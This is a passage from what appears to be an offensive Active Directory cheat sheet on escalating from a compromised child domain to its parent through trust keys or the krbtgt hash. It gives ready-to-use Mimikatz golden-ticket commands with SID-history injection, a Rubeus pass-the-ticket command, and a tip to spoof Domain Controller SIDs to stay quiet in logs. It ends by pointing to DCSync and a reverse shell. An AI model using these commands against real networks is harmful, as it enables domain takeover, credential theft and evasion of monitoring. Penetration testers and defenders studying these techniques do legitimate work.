All commands must be run with DA privileges in the current domain.

Note that if you completely compromise a child domain (`currentdomain.targetdomain.com`), you can _by definition_ also compromise the parent domain (`targetdomain.com`) due to the implicit trust relationship. The same counts for any trust relationship where SID filtering is disabled (see [‘Abusing inter-forest trust’](https://casvancooten.com/posts/2020/11/windows-active-directory-exploitation-cheat-sheet-and-command-reference/#abusing-inter-forest-trust) below).

#### Using domain trust key

From the DC, dump the hash of the `currentdomain\targetdomain$` trust account using Mimikatz (e.g. with LSADump or DCSync). Then, using this trust key and the domain SIDs, forge an inter-realm TGT using Mimikatz, adding the SID for the target domain’s enterprise admins group to our ‘SID history’.

```plaintext
kerberos::golden /domain:currentdomain.targetdomain.com /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-519 /rc4:e4e47c8fc433c9e0f3b17ea74856ca6b /user:Administrator /service:krbtgt /target:targetdomain.com /ticket:c:\users\public\ticket.kirbi
```

Pass this ticket with Rubeus.

```powershell
.\Rubeus.exe asktgs /ticket:c:\users\public\ticket.kirbi /service:LDAP/dc.targetdomain.com /dc:dc.targetdomain.com /ptt
```

We can now DCSync the target domain (see below).

#### Using krbtgt hash

From the DC, dump the krbtgt hash using e.g. DCSync or LSADump. Then, using this hash, forge an inter-realm TGT using Mimikatz, as with the previous method.

Doing this requires the SID of the current domain as the `/sid` parameter, and the SID of the target domain as part of the `/sids` parameter. You can grab these using PowerView’s `Get-DomainSID`. Use a SID History (`/sids`) of `*-516` and `S-1-5-9` to disguise as the Domain Controllers group and Enterprise Domain Controllers respectively, to be less noisy in the logs.

```plaintext
kerberos::golden /domain:currentdomain.targetdomain.com /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-516,S-1-5-9 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /user:DC$ /groups:516 /ptt
```

> If you are having issues creating this ticket, try adding the ’target’ flag, e.g. `/target:targetdomain.com`.

Alternatively, generate a domain admin ticket with SID history of enterprise administrators group in the target domain.

```
kerberos::golden /user:Administrator /domain:currentdomain.targetdomain.com /sid:S-1-5-21-1874506631-3219952063-538504511 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /sids:S-1-5-21-280534878-1496970234-700767426-519 /ptt
```

We can now immediately DCSync the target domain, or get a reverse shell using e.g. scheduled tasks.